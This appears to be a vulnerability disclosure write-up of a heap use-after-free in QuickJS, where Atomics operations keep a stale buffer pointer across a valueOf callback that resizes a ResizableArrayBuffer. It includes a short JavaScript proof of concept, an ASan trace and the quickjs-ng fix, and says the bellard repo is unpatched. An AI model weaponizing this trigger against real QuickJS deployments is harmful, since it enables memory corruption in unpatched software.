## What I was looking at

I had been reading through QuickJS internals for a while, mostly trying to understand how it handles TypedArrays. QuickJS is one of those codebases that looks clean on the surface but has a lot of subtle state being passed around through pointers and context structs. The more I read, the more I wanted to find a spot where that state got out of sync.

ResizableArrayBuffer caught my attention specifically. It was added to the ES2024 spec and QuickJS picked it up in late 2024. The idea is simple: you can create an ArrayBuffer with a fixed current size but a higher maximum, then call `.resize()` to change the current size without creating a new buffer. The backing memory can move when you do that.

That last part is the interesting bit. When memory moves, every pointer that was pointing into the old allocation becomes invalid. The runtime has to update them all. If it misses one, that pointer is now a dangling reference into freed heap memory.

---

## How QuickJS manages typed array pointers

When you create a TypedArray backed by an ArrayBuffer, QuickJS stores the base pointer to the buffer's data in the TypedArray object. Something like:

```c
p->u.array.u.uint8_ptr = abuf->data;
```

Where `p` is the TypedArray's JSObject and `abuf` is the ArrayBuffer object.

When a ResizableArrayBuffer gets resized, QuickJS calls `js_array_buffer_resize()`, which calls `js_realloc()` to get a new allocation. If the allocator moves the memory (which it often does when growing), the old address is freed and `abuf->data` is updated to the new address. Then `js_array_buffer_update_typed_arrays()` walks all TypedArrays linked to that buffer and updates their stored pointers.

This part works correctly. The problem is not in the resize path itself.

---

## Where the bug lives

The problem is in the Atomics functions. When you call `Atomics.add(ta, 0, value)`, the engine needs to:

1. Validate the TypedArray and get a pointer into its backing memory
2. Convert `value` to a number
3. Do the atomic operation using that pointer

Step 1 calls `js_atomics_get_ptr()`, which returns a raw C pointer directly into the buffer. Step 2 calls `JS_ToUint32()` or similar. Step 3 uses the pointer from step 1.

The issue is that step 2 is a JavaScript call. It runs `value.valueOf()` if `value` is an object. That valueOf callback can do anything, including calling `rab.resize()` on the backing buffer.

```c
// Step 1 - ptr points into current buffer
if (js_atomics_get_ptr(ctx, &ptr, &p, &idx, &size_log2, &class_id,
                       argv[0], argv[1], 0))
    return JS_EXCEPTION;

// Step 2 - JS call happens here. valueOf() can resize the RAB.
//          js_realloc() runs, old buffer is freed, ptr is now stale.
if (JS_ToUint32(ctx, &v32, argv[2]))
    return JS_EXCEPTION;

// Step 3 - bounds check runs, but ptr is NOT re-fetched
if (typed_array_is_oob(p))
    return JS_ThrowTypeErrorDetachedArrayBuffer(ctx);
if (idx >= p->u.array.count)
    return JS_ThrowRangeError(ctx, "out-of-bound access");

// Step 4 - UAF write using stale ptr
a = atomic_fetch_add((_Atomic(uint32_t) *)ptr, v);
```

The bounds check in step 3 is not wrong exactly. It reads the current state of the TypedArray object, which has been updated by `js_array_buffer_update_typed_arrays()`. But `ptr` is a local variable that was captured before the resize. It still points to the old freed allocation.

If you resize the buffer to a larger or equal size, the index stays valid and the bounds check passes. But `ptr` is pointing at freed memory. The atomic write goes there.

---

## Watching the pointer go stale

To make this concrete, here is what happens in memory during the attack sequence:

```
1. rab = new ArrayBuffer(4, { maxByteLength: 4MB })
   - allocator gives us, say, 0xAABBCC00
   - abuf->data    = 0xAABBCC00
   - ta->uint8_ptr = 0xAABBCC00

2. Atomics.add(ta, 0, evil) enters js_atomics_op()
   - js_atomics_get_ptr() captures ptr = 0xAABBCC00

3. JS_ToUint32() calls evil.valueOf()
   - evil.valueOf() calls rab.resize(4MB)
   - js_realloc(0xAABBCC00, 4MB) runs
   - allocator moves the block:
     new allocation at 0xDDEEFF00
     old block at 0xAABBCC00 is freed
   - abuf->data    = 0xDDEEFF00  (updated)
   - ta->uint8_ptr = 0xDDEEFF00  (updated by update_typed_arrays)
   - ptr           = 0xAABBCC00  (stale, not updated)

4. idx=0, p->u.array.count=1M, bounds check passes

5. atomic_fetch_add(ptr, v) writes to 0xAABBCC00
   - that region is freed
   - heap-use-after-free write
```

The engine's global state is consistent. Only the local `ptr` is wrong. And the bounds check looks at the global state, not `ptr`, so it cannot catch this.

---

## Building the proof of concept

The PoC is nine lines. The key is that `valueOf` needs to resize to at least the same size so the index stays in bounds:

```javascript
const rab = new ArrayBuffer(4, { maxByteLength: 4 * 1024 * 1024 });
const ta  = new Int32Array(rab);

const evil = {
  valueOf() {
    rab.resize(4 * 1024 * 1024);
    return 1;
  }
};

Atomics.add(ta, 0, evil);
```

I compiled QuickJS with AddressSanitizer to confirm:

```bash
clang -fsanitize=address,undefined -g -O1 \
  -DCONFIG_VERSION=\"2025-09-13\" \
  quickjs.c -o qjs_asan -lm
```

Then ran:

```bash
./qjs_asan poc.js
```

---

## What ASan said

```
ERROR: AddressSanitizer: heap-use-after-free on address 0x7b62f33e0650
WRITE of size 4 at 0x7b62f33e0650 thread T0
    #0 js_atomics_op quickjs.c:59151

freed by thread T0 here:
    #0 realloc
    #1 js_def_realloc quickjs.c:1784

previously allocated by thread T0 here:
    #0 malloc
    #1 js_def_malloc quickjs.c:1746
```

Line 59151 is exactly the atomic operation. The freed address matches the original buffer allocation. The resize triggered by `valueOf` freed it at line 1784. This is the write happening at the exact wrong place.

I went back and tested every Atomics function the same way. All of them route through the same pattern: capture pointer before a JS call, use pointer after.

---

## All eight operations

The bug is not specific to `Atomics.add`. Every operation that takes a value argument has the same structure: get pointer, convert value (JS call), use pointer.

| Function | Trigger | Path |
|---|---|---|
| `Atomics.add(ta, 0, evil)` | evil.valueOf() | js_atomics_op() |
| `Atomics.sub(ta, 0, evil)` | evil.valueOf() | js_atomics_op() |
| `Atomics.and(ta, 0, evil)` | evil.valueOf() | js_atomics_op() |
| `Atomics.or(ta, 0, evil)` | evil.valueOf() | js_atomics_op() |
| `Atomics.xor(ta, 0, evil)` | evil.valueOf() | js_atomics_op() |
| `Atomics.exchange(ta, 0, evil)` | evil.valueOf() | js_atomics_op() |
| `Atomics.store(ta, 0, evil)` | evil.valueOf() | js_atomics_store() |
| `Atomics.compareExchange(ta, 0, evil, rep)` | evil.valueOf() | both paths |

`compareExchange` has two value positions. Both trigger the same bug.

I tested each one individually. Every one produced the same ASan output pointing at a write to freed memory. This affects bellard/quickjs master at commit d7ae12a, the latest at time of writing.

---

## The fix

quickjs-ng already patched this. Their fix is to re-fetch `ptr` from the TypedArray after value conversion and after the bounds check:

```c
/* check if an evil .valueOf has resized or detached the array */
if (idx >= p->u.array.count)
    return JS_ThrowRangeError(ctx, "out-of-bound access");

/* re-fetch ptr AFTER value conversion */
ptr = p->u.array.u.uint8_ptr + ((uintptr_t)idx << size_log2);
```

That is it. One line added after the bounds check. At that point `p->u.array.u.uint8_ptr` has been updated by `js_array_buffer_update_typed_arrays()`, so re-fetching it gives you the valid current address. The atomic operation then writes to where the data actually lives.

The same change needs to go into both `js_atomics_op()` and `js_atomics_store()`.

The bellard repo does not have this fix yet.

---

*Target: bellard/quickjs master d7ae12a. Tested on Kali Linux with clang 18 + ASan. quickjs-ng already patched.*
